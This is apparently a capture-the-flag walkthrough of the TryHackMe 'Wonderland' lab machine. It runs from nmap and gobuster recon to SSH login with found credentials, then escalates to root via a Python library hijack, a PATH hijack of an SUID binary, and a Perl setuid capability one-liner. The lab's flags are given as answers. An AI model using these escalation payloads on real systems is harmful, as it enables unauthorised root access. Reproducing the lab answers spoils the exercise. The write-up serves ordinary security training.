# Wonderland - Medium

![Wonderland](https://i.imgur.com/rhvJ8ft.jpg)

## Hints:
> Everything is upside down here.

## Solving:

First we run an NMAP scan ```sudo nmap -sC -sV -p- -oA scan 10.10.40.120 -vv```
Key info:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Since it seems to be running a http server we can navigate to that. It shows the page:
![firstpage](https://i.imgur.com/j8sbaR5.png)

After downloading the image I found it includes a hint.txt file. Using steghide to extract the file it contained: 
> follow the r a b b i t

Not very helpful.

The next stage was to run a directory brute force with gobuster.
```bash
gobuster dir -u http://10.10.40.120/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x html,txt,php

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.40.120/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/21 14:01:40 Starting gobuster
===============================================================
http://10.10.40.120/index.html (Status: 301)
http://10.10.40.120/img (Status: 301)
http://10.10.40.120/r (Status: 301)
```

We can see where this is going. Each subsiquent directory contains more of the dialogue until we get to ```http://10.10.40.120/r/a/b/b/i/t/.

![secondpage][https://i.imgur.com/fZWakQr.png]

Looking immediately at the source we seem what could be some credentials
> alice:HowDothTheLittleCrocodileImproveHisShiningTail


 We can try this with the SSH service that is running

```bash
ssh alice@10.10.40.120

...

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 21 14:07:50 UTC 2021

  System load:  0.0                Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 14%                IP address for eth0: 10.10.40.120
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 

```

It worked!


```bash

$id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

$ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py

$ uname -a
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

$ ls -la ../
total 24
drwxr-xr-x  6 root      root      4096 May 25  2020 .
drwxr-xr-x 23 root      root      4096 May 25  2020 ..
drwxr-xr-x  5 alice     alice     4096 May 25  2020 alice
drwxr-x---  3 hatter    hatter    4096 May 25  2020 hatter
drwxr-x---  2 rabbit    rabbit    4096 May 25  2020 rabbit
drwxr-x---  6 tryhackme tryhackme 4096 May 25  2020 tryhackme
alice@wonderland:~$ 

```

It looks like the root.txt file and this python script are owned by root (always interesting). I will try ```sudo -l``` to check if Alice's password is the same as her SSH login.
```bash
$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
This is the obvious escalation method but i'll look for other simple things just in case.

SUID processes ```find / -type f -perm -u=s 2>/dev/null```. Nothing out of the ordinary. 
There are 3 other users on the box.
```bash
$ id hatter
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
$ id rabbit
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
$ id tryhackme
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

I put linpeas.sh in to a local directory and ran a HTTP server.
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

I then got the file using ```wget``` and ran it in the ```/tmp/``` folder using ```/bin/bash linpeas.sh | tee lin.pea```

Nothing too helpful either. Using the inital hint for the box and noticing root.txt was in this user directory I took a shot at user.txt being in /root/. 
```bash
$ cat /root/user.txt
thm{"xxxxxxxxx xxx xxxxxxxxx!"}
```

I looked bash at the python script in Alice's home directory as it was a root owned and user readable.

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```


The ```import random``` library path is relative as it looks in the script directory before checking the paths that the version of Linux/Ubuntu has configured out of the box. I checked to see which version of python was installed under /usr/lib/ and saw python3.6 - which matches the sudo command earlier. I found [an article](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) on Python Library Hijacking and used the command:
```bash
$python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python36.zip
/usr/lib/python3.6
/usr/lib/python3.6/lib-dynload
/usr/local/lib/python3.6/dist-packages
/usr/lib/python3/dist-packages
``` 

```bash
$ find / -type f -name random.py 2>/dev/null
/usr/lib/python3.6/random.py
```
After creating a new random.py in Alice's home directory, we want it to run a shell as user Rabbit when executed in the root python script.

```python
import os
os.system("/bin/bash")
```
We could also use pty for this. 

```bash
$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$
```
Looking at rabbit's home directory we see an ELF file owned by root with SUID permissions.

```bash
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sun, 21 Feb 2021 20:44:57 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

I copied teaParty to /tmp/ and set up a python http server. In hindsight I could have used ```scp``` command since I was in an SSH. I then ran strings in the first instance to see if there was something easy to spot. 
I saw a /bin/echo command being called referenceing yet another binary ```date```.
```bash
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

Perhaps if we use the identical technique of hijacking a referenced library we can spawn a shell as another user. Python libraries will look in the existing directory however binaries look up the directory in the PATH variable so we need to update it. We can add rabbit's home directory by using:

```bash
$ export PATH=/home/rabbit:$PATH
```
We can then ```chmod +x``` to a new date file that simply runs bash
```bash
#!/bin/bash
/bin/bash
```

```bash
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

> hatter:WhyIsARavenLikeAWritingDesk?


I had to exit the original SSH session here and rejoin as hatter with the above credentials. hatter had no sudo credentials so I ran linpeas.sh that was still in the /tmp/ directory.
LinPeas showed that Perl is accessible as a capability. I read an article recently on capabilities [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

To search for these we can also use the command ```getcap -r / 2>/dev/null``` this is also taught in another TryHackMe room. (Link to be added)

Next we can use good ol' [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities)

![GTFOBins](https://i.imgur.com/zcTaWSk.png "gtfobins")

```bash
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# cd /home/alice
# ls
random.py  root.txt  walrus_and_the_carpenter.py
# cat root.txt 
thm{xxxxxx, xxxxxxx, xxxxxx xxx! xxx x xxxxx xxxx xxx’xx xx!}
```

Box Done.





### User Flag: 

>! thm{"Curiouser and curiouser!"}



### Root Flag:

>! thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
